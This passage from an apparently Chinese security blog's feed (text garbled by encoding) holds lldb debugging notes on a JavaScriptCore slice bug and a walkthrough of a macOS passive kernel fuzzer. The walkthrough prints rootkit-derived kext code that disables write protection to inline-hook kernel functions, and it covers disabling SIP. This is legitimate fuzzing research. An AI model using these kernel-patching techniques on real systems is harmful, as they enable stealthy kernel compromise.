<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 55532 stopped&#10;* thread #1: tid = 0x26497e, 0x000000010034319a JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 410 at ArrayPrototype.cpp:868, queue = &#39;com.apple.main-thread&#39;, stop reason = step over&#10;    frame #0: 0x000000010034319a JavaScriptCore`JSC::arrayProtoFuncSlice(exec=0x00007fff5fbfd910) + 410 at ArrayPrototype.cpp:868&#10;   865&#10;   866 &#9;    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &#38;&#38; isJSArray(thisObj))) &#123;&#10;   867 &#9;        if (JSArray* result = asArray(thisObj)-&#62;fastSlice(*exec, begin, end - begin))&#10;-&#62; 868 &#9;            return JSValue::encode(result);&#10;   869 &#9;    &#125;&#10;   870&#10;   871 &#9;    JSObject* result;&#10;(lldb) memory read --format x --size 8 --count 10 0x00000001069e4768&#10;0x1069e4768: 0x3fbf7ced916872b0 0x3ff1f7ced916872b&#10;0x1069e4778: 0x0000000a0000000a 0x3fbf7ced916872b0&#10;0x1069e4788: 0x3ff1f7ced916872b 0x0000000a0000000a&#10;0x1069e4798: 0x0000000000000000 0x0000000000000000&#10;0x1069e47a8: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ‹·è´åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œè¯»è¿‡<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>å°±ä¼šçŸ¥é“ï¼Œè¿™æ˜¯åœ¨å­˜å‚¨åŒºåŸŸç›¸é‚»çš„ä¸€ä¸ª<code>object</code>çš„æ•°æ®ã€‚</p>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>ç†è§£äº†æ¼æ´çš„æˆå› ä¹‹åï¼Œ<a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">writeup</a>ä¸­ä»‹ç»æ›´é«˜çº§çš„åˆ©ç”¨æŠ€å·§ã€‚</p>
<ul>
<li>åœ°å€æ³„éœ²</li>
<li>ä¼ªé€ object</li>
<li>ä»»æ„åœ°å€è¯»å†™</li>
</ul>
<p>ç†è§£äº†æœ¬æ–‡çš„å†…å®¹ï¼Œè¯»è€…è‡ªè¡Œè°ƒè¯•åé¢çš„åˆ©ç”¨æŠ€å·§å¹¶ä¸å›°éš¾ã€‚è¿™é‡Œå°±è¯¦ç»†è®°å½•äº†ã€‚</p>
<h1 id="å¼•ç”¨">å¼•ç”¨</h1><p>[1] <a href="http://phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="external">http://phrack.org/papers/attacking_javascript_engines.html</a></p>
<p>[2] <a href="https://webkit.org/building-webkit/" target="_blank" rel="external">https://webkit.org/building-webkit/</a></p>
<p>[3] <a href="https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/" target="_blank" rel="external">https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/</a></p>
<h1 id="PS">PS</h1><p>Thanks to <a href="phrack@saelo.net">saelo</a> for answering my doubts ï¼šï¼‰</p>
<p><a href="https://twitter.com/5aelo" target="_blank" rel="external">https://twitter.com/5aelo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p> æœ¬æ–‡åŸºäº<a href="phrack@saelo.net">saelo</a>åœ¨ <a href="http://phrack.org">phrack</a>ä¸Šå‘è¡¨çš„<a href="http://phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines</a>ä¸€æ–‡ï¼Œè®°å½•äº†è°ƒè¯•çš„è¿‡ç¨‹ã€‚</p>
<p><a href="https://github.com/saelo/jscpwn">POC</a></p>]]>
    
    </summary>
    
      <category term="javascrip" scheme="http://turingh.github.io/tags/javascrip/"/>
    
      <category term="safari" scheme="http://turingh.github.io/tags/safari/"/>
    
      <category term="webkit" scheme="http://turingh.github.io/tags/webkit/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PassiveFuzzæ¡†æ¶è¯•ç”¨ä¸è°ƒè¯•å°è®°]]></title>
    <link href="http://turingh.github.io/2016/11/21/try-out-PassiveFuzzFrameworkOSX/"/>
    <id>http://turingh.github.io/2016/11/21/try-out-PassiveFuzzFrameworkOSX/</id>
    <published>2016-11-22T03:22:12.000Z</published>
    <updated>2016-11-22T05:17:02.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å‰æ®µæ—¶é—´<code>TREND</code>çš„ç ”ç©¶å‘˜åœ¨<code>POC</code>å®‰å…¨å¤§ä¼šä¸Šä»‹ç»äº†ä¸€æ¬¾<code>OS X</code>ç³»ç»Ÿä¸Šé¢çš„<code>Fuzz</code>æ¡†æ¶ï¼Œå¹¶ä¸”å¼€æºäº†ã€‚<code>github</code>ç‚¹<a href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚æˆ‘è®°å¾—çœ‹é›ªå¥½åƒå·²ç»æœ‰ç¿»è¯‘æˆä¸­æ–‡ç‰ˆçš„PPTï¼Œæ‰¾äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°:-(ã€‚ç½‘ä¸Šèƒ½æ‰¾åˆ°çš„ä¿¡æ¯ï¼Œè¿™é‡Œå°±ä¸å¤è¿°äº†ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œé˜…è¯»ã€‚</p>
<p>â€‹    ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡å†…æ ¸æ‰©å±•ï¼Œå¯¹ä¸€ç³»åˆ—å†…æ ¸å‡½æ•°è¿›è¡Œ<code>inline hook</code>ï¼Œåœ¨è¿™äº›è¢«<code>hook</code>çš„å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸€äº›éšæœºçš„ä¿®æ”¹ã€‚æ‰€ä»¥å«åšè¢«åŠ¨å¼Fuzzï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„ä¸»åŠ¨è°ƒç”¨å†…æ ¸å‡½æ•°ä¼ å…¥ä¸åŒçš„å‚æ•°ã€‚</p>
<a id="more"></a>
<h1 id="0x01_XNUå†…æ ¸å‡½æ•°ç¬¦å·">0x01 XNUå†…æ ¸å‡½æ•°ç¬¦å·</h1><p>â€‹    å› ä¸ºæ˜¯é€šè¿‡ç¼–å†™<code>XNU</code>å†…æ ¸æ‰©å±•çš„å®ç°çš„<code>inline hook</code>æ„å»ºçš„æ•´å¥—<code>Fuzz</code>çš„æ¡†æ¶ï¼Œå†…æ ¸çš„ç¬¦å·è¡¨æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„äº‹æƒ…ï¼ŒåŒæ—¶åœ¨ç¼–å†™ä¸€äº›å†…æ ¸æ¼æ´çš„åˆ©ç”¨æ—¶ï¼Œå†…æ ¸çš„ç¬¦å·è¡¨åŒæ ·çš„é‡è¦ã€‚è¿™é‡Œç®€å•çš„ä»‹ç»ä¸€ä¸‹æ€è·¯å’Œæµç¨‹ï¼Œå…·ä½“çš„æ€è·¯ç½‘ä¸Šå·²ç»æœ‰å¾ˆè¯¦ç»†çš„å™è¿°ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œé˜…è¯»ç›¸å…³çš„æŠ€æœ¯ç»†èŠ‚[<a href="http://phrack.org/issues/69/7.html#article" target="_blank" rel="external">1</a>] [<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">2</a>] ã€‚</p>
<ul>
<li>è¯»å–å†…æ ¸æ–‡ä»¶çš„Mach-Oå¤´éƒ¨</li>
<li>ä»<code>__TEXT</code>ã€<code>__LINKEDIT</code>çš„<code>segment</code>ä¸­è·å–ç›¸å…³ä¿¡æ¯</li>
<li>ä»<code>LC_SYMTAB</code>è·å–<code>nlist</code>æ•°æ®ç»“æ„</li>
<li>ç»“åˆè·å–åˆ°çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºéœ€è¦çš„å†…æ ¸å‡½æ•°åœ¨è¿è¡Œæ—¶çš„åœ°å€äº†ã€‚</li>
</ul>
<p>ç›¸å…³çš„æºç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œä¸è¿‡å’Œæˆ‘ä»¬fuzzçš„æ ¸å¿ƒé€»è¾‘å…³ç³»ä¸å¤§ï¼Œå¯ä»¥çœ‹åˆ°æºç çš„<code>main.c</code>æ–‡ä»¶ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">the_flying_circus_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr= KERN_SUCCESS;</span><br><span class="line">    </span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    <span class="comment">//moony_modify//printf("[DEBUG] Starting the circus  the_flying_circus_start...\n");</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// read kernel from filesystem and initialize a kernel_info structure</span></span><br><span class="line">    <span class="keyword">if</span>(init_kernel_info(&amp;g_kernel_info)) <span class="keyword">return</span> KERN_FAILURE; &lt;--è¿™é‡Œåšçš„äº‹æƒ…å°±æ˜¯è§£å†³å†…æ ¸ç¬¦å·</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if zombie mode is activated, all the rootkit features will be activated</span></span><br><span class="line">    <span class="comment">// inside the zombie thread and we just return failure here</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> ZOMBIE_MODE &gt; <span class="number">0</span></span></span><br><span class="line">    <span class="comment">// disable logging features to avoid error messages from kext failure to load</span></span><br><span class="line">    <span class="comment">//disable_oskextlog();</span></span><br><span class="line">    <span class="comment">//disable_kextd_syslog();</span></span><br><span class="line">    <span class="comment">// activate the zombie</span></span><br><span class="line">    <span class="comment">//unleash_the_zombie();</span></span><br><span class="line">    <span class="comment">//return KERN_FAILURE;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*...*/</span> <span class="comment">//rootkitç›¸å…³çš„åŠŸèƒ½ï¼Œä¸æˆ‘ä»¬çš„fuzzé€»è¾‘æ— å…³ï¼Œä¸éœ€è¦å…³æ³¨</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">//@flyic moony_li@trendmicro.com 2015-06-17</span></span><br><span class="line">    kr |= init_inline_hook();				&lt;-- åˆå§‹åŒ–<span class="keyword">inline</span> hookçš„ä¿¡æ¯	</span><br><span class="line">    kr |= install_inline_hook();			 &lt;-- <span class="keyword">inline</span> hook å…·ä½“å®æ–½</span><br><span class="line">    <span class="comment">//set_kernel_panic_hook();//This way for monior panic dump does not work!</span></span><br><span class="line">    <span class="comment">//moony_modify//printf("[DEBUG] the_flying_circus_start done...\n");</span></span><br><span class="line">    <span class="comment">//init_collect_log();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02_inline_hookçš„å®ç°">0x02 inline hookçš„å®ç°</h1><p>è¿™é‡Œç®€å•çš„é˜…è¯»ä¸€ä¸‹æºç ï¼Œçœ‹çœ‹<code>inline hook</code>çš„å…·ä½“å®ç°ã€‚æœ€æ ¸å¿ƒçš„å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">install_trampoline_any(<span class="keyword">mach_vm_address_t</span> patch_addr, <span class="keyword">mach_vm_address_t</span> dest_address, <span class="keyword">void</span> *orig_bytes)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> trampoline[<span class="number">12</span>] = <span class="string">"\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"</span> <span class="comment">// mov rax, address</span></span><br><span class="line">    <span class="string">"\xFF\xE0"</span>; <span class="comment">// jmp rax</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//mach_vm_address_t patch_addr = solve_kernel_symbol(&amp;g_kernel_info, symbol);</span></span><br><span class="line">    <span class="keyword">if</span> (patch_addr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">        <span class="comment">//moony_modify//printf("[ERROR] patch_addr[0x%x] is not valid [%s]\n", patch_addr, __FUNCTION__);</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// store the original bytes in user provided buffer</span></span><br><span class="line">    <span class="built_in">memcpy</span>(orig_bytes, (<span class="keyword">void</span>*)patch_addr, <span class="keyword">sizeof</span>(trampoline));</span><br><span class="line">    <span class="comment">// XOR the original bytes</span></span><br><span class="line">    <span class="comment">//for (int i = 0; i &lt; TRAMPOLINE_SIZE; i++)</span></span><br><span class="line">    <span class="comment">//    ((char*)orig_bytes)[i] ^= XOR_KEY;</span></span><br><span class="line">    <span class="comment">// set the target address</span></span><br><span class="line">    <span class="built_in">memcpy</span>(trampoline+<span class="number">2</span>, &amp;dest_address, <span class="keyword">sizeof</span>(<span class="keyword">mach_vm_address_t</span>));</span><br><span class="line">    <span class="comment">// patch the target address with the trampoline</span></span><br><span class="line">    disable_interrupts();</span><br><span class="line">    disable_wp();</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)patch_addr, trampoline, <span class="keyword">sizeof</span>(trampoline));</span><br><span class="line">    enable_wp();</span><br><span class="line">    enable_interrupts();</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®ç°é€»è¾‘ååˆ†ç®€å•ï¼š</p>
<ul>
<li>è§£å†³å‡½æ•°ç¬¦å·ä¹‹åï¼Œè·å–ç›®æ ‡å‡½æ•°çš„åœ°å€</li>
<li>å°†ç›®æ ‡åœ°å€å¤„çš„ä»£ç æ›¿æ¢æˆè·³è½¬çš„åˆ°æˆ‘ä»¬è‡ªå·±å®ç°çš„å‡½æ•°çš„ä»£ç </li>
</ul>
<p>åœ¨<code>install_trampoline_any</code>å¤„ä¸‹æ–­ç‚¹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0001, 0xffffff7f8ba5ff02 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 34 at hijacking_utils.c:271, stop reason = breakpoint 1.1&#10;    frame #0: 0xffffff7f8ba5ff02 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 34 at hijacking_utils.c:271&#10;   268 &#9;kern_return_t&#10;   269 &#9;install_trampoline_any(mach_vm_address_t patch_addr, mach_vm_address_t dest_address, void *orig_bytes)&#10;   270 &#9;&#123;&#10;-&#62; 271 &#9;    char trampoline[12] = &#34;\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00&#34; // mov rax, address&#10;   272 &#9;    &#34;\xFF\xE0&#34;; // jmp rax&#10;   273&#10;   274 &#9;    //mach_vm_address_t patch_addr = solve_kernel_symbol(&#38;g_kernel_info, symbol);</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹<code>patch_addr</code>å’Œ<code>dest_address</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.development`ipc_kmsg_get:&#10;    0xffffff8009c5ea50 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff8009c5ea51 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff8009c5ea54 &#60;+4&#62;:  pushq  %r15&#10;    0xffffff8009c5ea56 &#60;+6&#62;:  pushq  %r14&#10;    0xffffff8009c5ea58 &#60;+8&#62;:  pushq  %r13&#10;    0xffffff8009c5ea5a &#60;+10&#62;: pushq  %r12&#10;    0xffffff8009c5ea5c &#60;+12&#62;: pushq  %rbx&#10;    0xffffff8009c5ea5d &#60;+13&#62;: subq   $0x28, %rsp&#10;    0xffffff8009c5ea61 &#60;+17&#62;: movq   %rdx, %r14&#10;    0xffffff8009c5ea64 &#60;+20&#62;: movl   %esi, %r13d&#10;    0xffffff8009c5ea67 &#60;+23&#62;: movq   %rdi, %r15&#10;(lldb) dis -s dest_address&#10;pasive_kernel_fuzz`trampline_ipc_kmsg_get:&#10;    0xffffff7f8ba61890 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff7f8ba61891 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff7f8ba61894 &#60;+4&#62;:  subq   $0x80, %rsp&#10;    0xffffff7f8ba6189b &#60;+11&#62;: movq   %rdi, -0x8(%rbp)&#10;    0xffffff7f8ba6189f &#60;+15&#62;: movl   %esi, -0xc(%rbp)&#10;    0xffffff7f8ba618a2 &#60;+18&#62;: movq   %rdx, -0x18(%rbp)&#10;    0xffffff7f8ba618a6 &#60;+22&#62;: nop&#10;    0xffffff7f8ba618a7 &#60;+23&#62;: nop&#10;    0xffffff7f8ba618a8 &#60;+24&#62;: nop&#10;    0xffffff7f8ba618a9 &#60;+25&#62;: nop</span><br></pre></td></tr></table></figure>
<p>åˆ†åˆ«æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°å’Œ<code>hook</code>å‡½æ•°ã€‚</p>
<p>æ‰§è¡Œåˆ°å‡½æ•°æ‰§è¡Œå®Œä¹‹åã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* thread #1: tid = 0x0001, 0xffffff7f8ba5ff88 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 168 at hijacking_utils.c:295, stop reason = step over&#10;    frame #0: 0xffffff7f8ba5ff88 pasive_kernel_fuzz`install_trampoline_any(patch_addr=18446743524117703248, dest_address=18446743522001688720, orig_bytes=0xffffff800e9aba80) + 168 at hijacking_utils.c:295&#10;   292 &#9;    memcpy((void*)patch_addr, trampoline, sizeof(trampoline));&#10;   293 &#9;    enable_wp();&#10;   294 &#9;    enable_interrupts();&#10;-&#62; 295 &#9;    return KERN_SUCCESS;&#10;   296 &#9;&#125;&#10;   297&#10;   298</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å†æ¬¡è§‚å¯Ÿ<code>patch_addr</code>å’Œ<code>dest_address</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.development`ipc_kmsg_get:&#10;    0xffffff8009c5ea50 &#60;+0&#62;:  movabsq $-0x807459e770, %rax      ; imm = 0xFFFFFF7F8BA61890&#10;    0xffffff8009c5ea5a &#60;+10&#62;: jmpq   *%rax&#10;    0xffffff8009c5ea5c &#60;+12&#62;: pushq  %rbx&#10;    0xffffff8009c5ea5d &#60;+13&#62;: subq   $0x28, %rsp&#10;    0xffffff8009c5ea61 &#60;+17&#62;: movq   %rdx, %r14&#10;    0xffffff8009c5ea64 &#60;+20&#62;: movl   %esi, %r13d&#10;    0xffffff8009c5ea67 &#60;+23&#62;: movq   %rdi, %r15&#10;(lldb) dis -s dest_address&#10;pasive_kernel_fuzz`trampline_ipc_kmsg_get:&#10;    0xffffff7f8ba61890 &#60;+0&#62;:  pushq  %rbp&#10;    0xffffff7f8ba61891 &#60;+1&#62;:  movq   %rsp, %rbp&#10;    0xffffff7f8ba61894 &#60;+4&#62;:  subq   $0x80, %rsp&#10;    0xffffff7f8ba6189b &#60;+11&#62;: movq   %rdi, -0x8(%rbp)&#10;    0xffffff7f8ba6189f &#60;+15&#62;: movl   %esi, -0xc(%rbp)&#10;    0xffffff7f8ba618a2 &#60;+18&#62;: movq   %rdx, -0x18(%rbp)&#10;    0xffffff7f8ba618a6 &#60;+22&#62;: nop&#10;    0xffffff7f8ba618a7 &#60;+23&#62;: nop&#10;    0xffffff7f8ba618a8 &#60;+24&#62;: nop&#10;    0xffffff7f8ba618a9 &#60;+25&#62;: nop</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç›®æ ‡å‡½æ•°å·²ç»æˆåŠŸçš„è¢«<code>inline hook</code>äº†ã€‚</p>
<h1 id="0x03_æ‰§è¡Œpasive_kel_fuzz-kext">0x03 æ‰§è¡Œpasive_kel_fuzz.kext</h1><p>â€‹    <code>github</code>ä¸­çš„æºç å…‹éš†ä¸‹æ¥ä¹‹åä¼šæœ‰æå‰ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äº†ä¹‹åæ²¡å•¥ååº”ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘ç›´æ¥ç”¨äº†è‡ªå·±ç¼–è¯‘çš„å†…æ ¸æ‰©å±•ã€‚</p>
<h2 id="3-1_å¯åŠ¨å‚æ•°">3.1 å¯åŠ¨å‚æ•°</h2><p>â€‹    å› ä¸ºæˆ‘æ²¡æœ‰ä¸¤å°æœºå™¨ç”¨çš„æ˜¯è™šæ‹Ÿæœºï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨æ–‡æ¡£ä¸­æ¨èçš„ç³»ç»Ÿå¯åŠ¨å‚æ•°ï¼Œæˆ‘ä½¿ç”¨çš„å¯åŠ¨å‚æ•°æ˜¯è¿™æ ·çš„</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10140;  Desktop sudo nvram boot-args&#10;Password:&#10;boot-args&#9;debug=0x141 kext-dev-mode=1 kcsuffix=development pmuflags=1 -v</span><br></pre></td></tr></table></figure>
<p>æœ¬æ¥æˆ‘ä½¿ç”¨çš„å¯åŠ¨å‚æ•°æ˜¯</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot-args&#9;debug=0xd66 _panicd_ip=xx.xx.xx.xx kext-dev-mode=1 kcsuffix=development pmuflags=1 -v</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å´©æºƒçš„<code>core</code>æ–‡ä»¶çœ‹ä¸åˆ°è°ƒç”¨æ ˆï¼Œåªèƒ½çœ‹åˆ°å´©æºƒçš„ä¸€å±‚æ ˆï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆã€‚æ‰€ä»¥ä½¿ç”¨åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ä½¿ç”¨<code>lldb</code>attach ä¸Šå»ï¼Œå¯ä»¥çœ‹åˆ°å´©æºƒæ—¶çš„å®Œæ•´æ ˆã€‚</p>
<h1 id="3-2_åŠ è½½å†…æ ¸">3.2 åŠ è½½å†…æ ¸</h1><p>æ²¡æœ‰ç­¾åæ˜¯åŠ è½½å†…æ ¸éœ€è¦æŠŠ<code>rootless</code>å…³æ‰ï¼Œä¹Ÿå°±æ˜¯<code>SIP</code>è¦å…³æ‰ã€‚</p>
<p>å…³é—­ä¹‹åå°±æ­£å¸¸çš„æŒ‰ç…§æ–‡æ¡£ä¸­çš„ä»‹ç»åŠ è½½å†…æ ¸å°±å¯ä»¥äº†ã€‚</p>
<h1 id="3-3_æ‰§è¡Œå´©æºƒ">3.3 æ‰§è¡Œå´©æºƒ</h1><p>åŠ è½½å†…æ ¸ä¹‹åï¼Œç³»ç»Ÿç«‹åˆ»å°±å´©æºƒäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/pasive_fuzz/dump.png" alt="å´©æºƒ"></p>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process 1 stopped&#10;* thread #1: tid = 0x0001, 0xffffff800d90e05b kernel.development`memcpy + 11, stop reason = EXC_BAD_ACCESS (code=1, address=0x163de000)&#10;    frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10;kernel.development`memcpy:&#10;-&#62;  0xffffff800d90e05b &#60;+11&#62;: rep&#10;    0xffffff800d90e05c &#60;+12&#62;: movsq  (%rsi), %es:(%rdi)&#10;    0xffffff800d90e05e &#60;+14&#62;: movq   %rdx, %rcx&#10;    0xffffff800d90e061 &#60;+17&#62;: andq   $0x7, %rcx&#10;(lldb) bt&#10;* thread #1: tid = 0x0001, 0xffffff800d90e05b kernel.development`memcpy + 11, stop reason = EXC_BAD_ACCESS (code=1, address=0x163de000)&#10;  * frame #0: 0xffffff800d90e05b kernel.development`memcpy + 11&#10;    frame #1: 0xffffff7f8e7485e8&#10;    frame #2: 0xffffff7f8e746630&#10;    frame #3: 0xffffff800e0b8507 kernel.development`::shim_io_connect_method_scalarI_scalarO(method=&#60;unavailable&#62;, object=&#60;unavailable&#62;, input=&#60;unavailable&#62;, inputCount=&#60;unavailable&#62;, output=&#60;unavailable&#62;, outputCount=&#60;unavailable&#62;) + 647 at IOUserClient.cpp:4086 [opt]&#10;    frame #4: 0xffffff800e0bacd8 kernel.development`IOUserClient::externalMethod(this=&#60;unavailable&#62;, selector=&#60;unavailable&#62;, args=&#60;unavailable&#62;, dispatch=&#60;unavailable&#62;, target=&#60;unavailable&#62;, reference=&#60;unavailable&#62;) + 632 at IOUserClient.cpp:5295 [opt]&#10;    frame #5: 0xffffff800e0b7e17 kernel.development`::is_io_connect_method(connection=0xffffff886e39ba50, selector=10, scalar_input=&#60;unavailable&#62;, scalar_inputCnt=&#60;unavailable&#62;, inband_input=&#60;unavailable&#62;, inband_inputCnt=0, ool_input=&#60;unavailable&#62;, ool_input_size=&#60;unavailable&#62;, inband_output=&#60;unavailable&#62;, inband_outputCnt=&#60;unavailable&#62;, scalar_output=&#60;unavailable&#62;, scalar_outputCnt=&#60;unavailable&#62;, ool_output=&#60;unavailable&#62;, ool_output_size=&#60;unavailable&#62;) + 487 at IOUserClient.cpp:3900 [opt]&#10;    frame #6: 0xffffff7f8f84dd03 pasive_kernel_fuzz`trampline_is_io_connect_method(connection=0xffffff8016acc200, selector=10, scalar_input=0xffffff8016659330, scalar_inputCnt=2, inband_input=&#34;&#34;, inband_inputCnt=0, ool_input=0, ool_input_size=0, inband_output=&#34;&#34;, inband_outputCnt=0xffffff8018e155fc, scalar_output=0xffffff886e39bd30, scalar_outputCnt=0xffffff886e39bd2c, ool_output=0, ool_output_size=0xffffff8016659364) + 1587 at is_io_connect_method_trampline.c:663&#10;    frame #7: 0xffffff800db58750 kernel.development`_Xio_connect_method(InHeadP=&#60;unavailable&#62;, OutHeadP=0xffffff8018e155d0) + 384 at device_server.c:8255 [opt]&#10;    frame #8: 0xffffff800da83443 kernel.development`ipc_kobject_server(request=0xffffff80166592a0) + 259 at ipc_kobject.c:340 [opt]&#10;    frame #9: 0xffffff800da5ef03 kernel.development`ipc_kmsg_send(kmsg=&#60;unavailable&#62;, option=&#60;unavailable&#62;, send_timeout=0) + 211 at ipc_kmsg.c:1443 [opt]&#10;    frame #10: 0xffffff800da75985 kernel.development`mach_msg_overwrite_trap(args=&#60;unavailable&#62;) + 197 at mach_msg.c:474 [opt]&#10;    frame #11: 0xffffff7f8f85df47 pasive_kernel_fuzz`trampline_mach_msg_overwrite_trap(args=0xffffff886e39bf28) + 311 at mach_msg_overwrite_trap_trampline.c:131&#10;    frame #12: 0xffffff800db7f000 kernel.development`mach_call_munger64(state=0xffffff8015920720) + 480 at bsd_i386.c:560 